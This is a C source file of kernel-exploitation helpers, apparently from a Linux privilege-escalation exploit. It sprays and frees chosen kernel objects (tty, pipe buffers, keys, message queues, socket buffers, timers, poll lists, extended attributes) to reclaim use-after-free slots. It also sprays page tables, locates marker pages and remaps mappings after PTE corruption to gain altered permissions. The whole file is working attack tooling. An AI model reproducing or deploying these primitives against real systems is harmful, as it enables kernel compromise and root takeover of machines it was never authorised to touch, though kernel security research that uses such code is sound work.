#define _GNU_SOURCE
#include "spray.h"
#include "../util/util.h"
#include <attr/xattr.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/poll.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>

int g_pipes[0x1000][0x2];
int g_socks[0x1000][0x2];
int g_qids[0x1000];
int g_keys[0x1000];
int g_seq_ops[0x10000];
int g_ptmx[0x1000];
int g_fds[0x1000];
int g_tfds[0x1000];
int g_n_keys;

atomic_uint g_polls_ready;
atomic_uint g_polls_done;

typedef struct {
    int wake_fd;
    size_t alloc_sz;
} held_poll_arg_t;

pthread_t g_poll_threads[0x1000];
held_poll_arg_t g_poll_args[0x1000];

// kmalloc-1k
void alloc_tty(size_t i) {
    g_ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (g_ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

void free_tty(size_t i) {
    if (close(g_ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

// used to be be kmalloc-1k, now kmalloc-cg-1k
void alloc_pipe_buf(int i) {
    if (pipe(g_pipes[i]) < 0) {
        errExit("alloc_pipe_buf");
        return;
    }
}

void release_pipe_buf(int i) {
    if (close(g_pipes[i][0]) < 0) {
        errExit("release_pipe_buf");
    }

    if (close(g_pipes[i][1]) < 0) {
        errExit("release_pipe_buf");
    }
}

static long keyctl(int operation, unsigned long arg2, unsigned long arg3,
                   unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

static inline key_serial_t add_key(const char *type, const char *description,
                                   const void *payload, size_t plen,
                                   key_serial_t ringid) {
    long ret = syscall(__NR_add_key, type, description, payload, plen, ringid);
    if (ret < 0) {
        errExit("add_key");
    }

    return ret;
}

// revoke -> RCU grace period -> callback -> ordinary kfree -> normal sheaf
long free_key(int id) {
    key_serial_t key = g_keys[id];
    long ret = keyctl(KEYCTL_REVOKE, key, 0, 0, 0);

    if (ret < 0) {
        errExit("free_key (keyctl_revoke)");
    }

    ret = keyctl(KEYCTL_UNLINK, key, KEY_SPEC_PROCESS_KEYRING, 0, 0);

    if (ret < 0) {
        errExit("free_key (keyctl_unlink)");
    }

    return ret;
}

long get_key(int i, char *buf, size_t sz) {
    long ret = keyctl(KEYCTL_READ, g_keys[i], (uint64_t)buf, sz, 0);
    if (ret < 0) {
        errExit("keyctl read");
    }

    return ret;
}

// `kmalloc-32 -kmalloc-4096?`
void alloc_key(int id, char *buf, size_t size) {
    char desc[0x400] = {0};
    char payload[0x1000] = {0};
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    if (!buf) {
        memset(payload, 0x41, size);
    } else {
        memcpy(payload, buf, size);
    }

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0) {
        errExit("add_key");
    }

    g_keys[id] = key;
}

void alloc_qid(int i) {
    g_qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (g_qids[i] < 0) {
        errExit("[X] msgget");
    }
}

// sizeof(struct skb_shared_info) == 0x140
#define SKB_SHARED_INFO_SIZE 0x140

// elastic object, kmalloc-cg-* caches ?
// 0x200 lands in kmalloc-cg-512
// skbuff.h
void alloc_skbuff_sock(int i) {
    int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]);
    if (ret < 0) {
        errExit("init skbuff failed");
    }
}

void free_skbuff_sock(int i) {
    if (close(g_socks[i][0]) < 0) {
        errExit("release_pipe_buf");
    }

    if (close(g_socks[i][1]) < 0) {
        errExit("release_pipe_buf");
    }
}

void write_skbuff(int idx, char *buf, size_t size) {
    if (size < SKB_SHARED_INFO_SIZE) {
        errExit("skbuff needs to be at least SKB_SHARED_INFO_SIZE big");
    }
    int ret = write(g_socks[idx][0], buf, size);
    if (ret < 0) {
        errExit("skbuff write");
    }
}

void read_skbuff(int idx, char *buf, size_t size) {
    int ret = read(g_socks[idx][1], buf, size);
    if (ret < 0) {
        errExit("skbuff write");
    }
}

void send_msg(int qid, int c, int size, long type) {
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SIZE) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf {
        long mtype;
        char mtext[size - off];
    } msg;

    if (!type) {
        msg.mtype = 0xffff;
    } else {
        msg.mtype = type;
    }

    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
        errExit("msgsnd");
    }
}

void send_msg_payload(int qid, char *buf, int size, long type) {
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SIZE) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf {
        long mtype;
        char mtext[size - off];
    } msg;

    memcpy(msg.mtext, buf, sizeof(msg.mtext));

    if (!type) {
        msg.mtype = 0xffff;
    } else {
        msg.mtype = type;
    }

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
        errExit("msgsnd");
    }
}

long recv_msg(int qid, void *data, int size, long type, bool copy) {
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SIZE) {
        off += sizeof(msg_msg_seg_t);
    }
    int ret;
    struct msg_buf {
        long mtype;
        char mtext[size - off];
    } msg;

    if (copy) {
        ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_COPY);
    } else {
        ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_NOERROR);
    }

    memcpy(data, msg.mtext, sizeof(msg.mtext));

    if (ret < 0) {
        errExit("msgrcv");
    }

    return msg.mtype;
}

// kmalloc-256
// timerfd_ctx` struct defined in `timerfd.c`
void alloc_timer(int i) {
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 2;
    its.it_value.tv_nsec = 0;

    g_tfds[i] = timerfd_create(CLOCK_REALTIME, 0);
    if (g_tfds[i] < 0) {
        errExit("[X] timerfd_create failed for: %d", i);
    }
}

// uses kfree_rcu() so need to sleep shortly to ensure RCU race period has
// elapsed
void free_timer(int i) {
    int ret = close(g_tfds[i]);
    if (ret < 0) {
        errExit("failed to free timer with fd: %d", i);
    }
}

void alloc_file(int i) {
    g_fds[i] = open("/etc/passwd", O_RDONLY);

    if (g_fds[i] < 1) {
        errExit("[X] init_fd failed for: %d", i);
    }
}

void free_file(int i) {
    int ret = close(g_fds[i]);
    if (ret < 0) {
        errExit("failed to free file with fd: %d", i);
    }
}

static int randint(int min, int max) { return min + (rand() % (max - min)); }

#define POLL_STACK_ALLOC 0x100
size_t poll_fds_to_alloc(size_t sz) {
    // Some poll descriptor are kept on syscall stack:
    // https://github.com/torvalds/linux/blob/e22254e9ddd8020130c4b806b6b4aa77b09c2560/fs/select.c#L982
    size_t to_alloc =
        (POLL_STACK_ALLOC - sizeof(poll_list_t)) / sizeof(struct pollfd);

    // subtract size needed for poll_list struct
    if (sz % PAGE_SIZE == 0) {
        sz -= sz / PAGE_SIZE * sizeof(poll_list_t);
    } else {
        sz -= (sz / PAGE_SIZE + 1) * sizeof(poll_list_t);
    }

    to_alloc += sz / sizeof(struct pollfd);

    return to_alloc;
}

static void *hold_poll_object(void *opaque) {
    held_poll_arg_t *arg = opaque;

    size_t poll_fd_cnt = poll_fds_to_alloc(arg->alloc_sz);
    struct pollfd *descriptors = calloc(poll_fd_cnt, sizeof(struct pollfd));

    // ensure the sprayed objects are managed by core 0
    assign_thread_to_core(0);

    for (unsigned i = 0; i < poll_fd_cnt; i++) {
        /* Negative fds are ignored; one shared eventfd keeps poll blocked. */
        descriptors[i].fd = -1;
        descriptors[i].events = POLLIN;
        descriptors[i].revents = 0;
    }
    // this keeps the poll blocked
    descriptors[0].fd = arg->wake_fd;

    atomic_fetch_add_explicit(&g_polls_ready, 1, memory_order_release);
    if (poll(descriptors, poll_fd_cnt, -1) < 0) {
        errExit("held poll");
    }

    // kmalloc object has been freed
    atomic_fetch_add_explicit(&g_polls_done, 1, memory_order_release);

    /*
     * Keep this task alive after poll() frees its poll_list.  Returning from
     * many threads here would add task/stack teardown allocations and frees
     * to the allocator state while the victim slab is being reclaimed.
     * pause() consumes no CPU, and the loop tolerates an incidental signal.
     */
    for (;;) {
        pause();
    }
}

void spray_poll_list(size_t i, size_t sz, int wake_fd) {
    g_poll_args[i].wake_fd = wake_fd;
    g_poll_args[i].alloc_sz = sz;

    if (pthread_create(&g_poll_threads[i], NULL, hold_poll_object,
                       &g_poll_args[i])) {
        errExit("pthread_create held poll");
    }
}

void free_poll_lists(int wake_fd) {
    if (eventfd_write(wake_fd, 1) < 0) {
        errExit("eventfd_write");
    }
}

// TODO: need to check this for the specific kernel. struct has changed quite
// often
#define XATTR_META_SIZE 0x20
// max value size
#define XATTR_SIZE_MAX 65536
// max name size
#define XATTR_NAME_MAX 255

static void make_xattr_name(char name[XATTR_NAME_MAX + 1], int i,
                            size_t name_len) {
    const size_t prefix_len = strlen("security.");

    if (i < 0 || name_len <= prefix_len || name_len > XATTR_NAME_MAX) {
        errExit("bad xattr name parameters");
    }

    int width = name_len - prefix_len;
    int ret = snprintf(name, XATTR_NAME_MAX + 1, "security.%0*d", width, i);

    if (ret < 0 || (size_t)ret != name_len)
        errExit("xattr name length mismatch");
}
// elastic object, that triggers two allocations: value and name
// both allocations use GFP_KERNEL_ACCOUNT, so will land in cg caches
//
// - value allocation via kvmalloc
// https://github.com/torvalds/linux/blob/acb7500801e98639f6d8c2d796ed9f64cba83d3a/fs/xattr.c#L1259-L1265
// - name allocation via kstrdup:
// https://github.com/torvalds/linux/blob/acb7500801e98639f6d8c2d796ed9f64cba83d3a/fs/xattr.c#L1377
void alloc_xattr_fd(int fd, int i, void *val, size_t val_size,
                    size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};
    int ret;

    if (val_size < XATTR_META_SIZE ||
        val_size - XATTR_META_SIZE > XATTR_SIZE_MAX) {
        errExit("invalid value allocation size");
    }

    val_size -= XATTR_META_SIZE;

    make_xattr_name(name, i, name_len);

    ret = fsetxattr(fd, name, val, val_size, XATTR_CREATE);
    if (ret < 0) {
        errExit("fsetxattr");
    }
}

void free_xattr_fd(int fd, int i, size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};
    make_xattr_name(name, i, name_len);

    int res = fremovexattr(fd, name);
    if (res < 0) {
        perror("fremovexattr");
    }
}

void alloc_xattr(char *path, int i, void *data, size_t val_size,
                 size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};
    int ret;

    if (val_size < XATTR_META_SIZE ||
        val_size - XATTR_META_SIZE > XATTR_SIZE_MAX) {
        errExit("invalid value allocation size");
    }

    val_size -= XATTR_META_SIZE;

    make_xattr_name(name, i, name_len);

    // TODO: XATTR_REPLACE ?
    ret = setxattr(path, name, data, val_size, XATTR_CREATE);
    if (ret < 0) {
        errExit("alloc_simple_xattr failed");
    }
}

void free_xattr(char *path, int i, size_t name_len) {
    char name[XATTR_NAME_MAX + 1] = {0};

    make_xattr_name(name, i, name_len);

    if (removexattr(path, name) < 0) {
        errExit("free_xattr");
    }
}

int create_marker_file(void) {
    int fd = memfd_create("pte-marker", MFD_CLOEXEC);
    unsigned char *mapping;

    if (fd < 0 || ftruncate(fd, PD_MAPPING_SIZE)) {
        errExit("create PTE marker file");
    }
    mapping =
        mmap(NULL, PD_MAPPING_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mapping == MAP_FAILED) {
        errExit("mmap PTE marker file");
    }

    // A's as marker
    memset(mapping, 0x41, PD_MAPPING_SIZE);

    return fd;
}

void map_marker_vmas(unsigned first, unsigned count, int marker_fd) {
    for (unsigned i = first; i < first + count; i++) {
        void *address = PTI_TO_VIRT(3, 0, i, 0);

        if (mmap(address, PD_MAPPING_SIZE, PROT_READ, MAP_SHARED | MAP_FIXED,
                 marker_fd, 0) == MAP_FAILED) {
            errExit("map page-table spray VMA");
        }
    }
}

// touch all locations within a page, where the uafed object may begin, causing
// PTEs to be created at that address
//
// **NOTE**: this requires the mapped region / file to be at least 2 MiB else
// SIGBUS is thrown when trying to access a page beyond EOF
void fault_marker_slots(unsigned start, unsigned len, size_t uafed_obj_size) {
    for (unsigned i = start; i < start + len; ++i) {
        unsigned pte_index_stride = uafed_obj_size / sizeof(uint64_t);
        unsigned uafed_objs_per_page = PAGE_SIZE / uafed_obj_size;
        for (unsigned slot = 0; slot < uafed_objs_per_page; ++slot) {
            uint64_t *addr = PTI_TO_VIRT(3, 0, i, slot * pte_index_stride);
            volatile uint64_t touch = *addr;
        }
    }
}

// return address of mapped region matching needle
uint8_t *search_marker_slots(unsigned start, unsigned len,
                             size_t uafed_obj_size, uint8_t *needle,
                             size_t needle_sz) {
    for (unsigned i = start; i < start + len; ++i) {
        unsigned pte_index_stride = uafed_obj_size / sizeof(uint64_t);
        unsigned uafed_objs_per_page = PAGE_SIZE / uafed_obj_size;
        for (unsigned slot = 0; slot < uafed_objs_per_page; ++slot) {
            uint8_t *addr = PTI_TO_VIRT(3, 0, i, slot * pte_index_stride);
            if (memcmp(addr, needle, needle_sz) == 0) {
                return addr;
            }
        }
    }

    return NULL;
}

// return address of mapped region not matching needle
uint8_t *search_marker_slots_negative(unsigned start, unsigned len,
                                      size_t uafed_obj_size, uint8_t *needle,
                                      size_t needle_sz) {
    for (unsigned i = start; i < start + len; ++i) {
        unsigned pte_index_stride = uafed_obj_size / sizeof(uint64_t);
        unsigned uafed_objs_per_page = PAGE_SIZE / uafed_obj_size;
        for (unsigned slot = 0; slot < uafed_objs_per_page; ++slot) {
            uint8_t *addr = PTI_TO_VIRT(3, 0, i, slot * pte_index_stride);
            if (memcmp(addr, needle, needle_sz) != 0) {
                return addr;
            }
        }
    }

    return NULL;
}

// spray file backed page tables
void spray_pt_fd(unsigned start, unsigned len, int fd) {
    for (unsigned i = start; i < start + len; ++i) {
        void *addr = PTI_TO_VIRT(3, 0, i, 0);
        uint64_t *p =
            mmap(addr, PAGE_SIZE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0);
        if (p == MAP_FAILED) {
            errExit("mmap failed");
        }

        // trigger allocation of page directory table
        volatile uint64_t touch = *p;
    }
}

// spray anonymous page tables
// jump in pmd-sized strides to ensure each loop allocates a new page table
void spray_pt(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        uint64_t *p = mmap(PTI_TO_VIRT(3, 0, i, 0), PAGE_SIZE, PROT_READ,
                           MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED, -1, 0);
        if (p == MAP_FAILED) {
            errExit("mmap failed");
        }

        volatile uint64_t touch = *p;
    }
}

void unspray_pt(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        int ret = munmap(PTI_TO_VIRT(3, 0, i, 0), PAGE_SIZE);
        if (ret < 0) {
            errExit("munmap");
        }
    }
}

// after corrupting PTE: use mremap to force invalidation of the original
// mapping and remapped region to have the corrupted permissions.
//
// Adjust function based on which PTE you are targeting.
//  + E.g. if you have control over a field at offset 0x18, then need to specify
//  `3` instead of `0`
void invalidate_pt_spray_mappings(unsigned start, unsigned len) {
    for (unsigned i = start; i < start + len; ++i) {
        void *src = PTI_TO_VIRT(3, 0, i, 0);
        void *dst = PTI_TO_VIRT(4, 0, i, 0);
        void *moved = mremap(src, PAGE_SIZE, PAGE_SIZE,
                             MREMAP_MAYMOVE | MREMAP_FIXED, dst);

        if (moved == MAP_FAILED) {
            errExit("mremap failed for i=%u", i);
        }
        if (moved != dst) {
            errExit("mremap returned unexpected address");
        }
    }
}
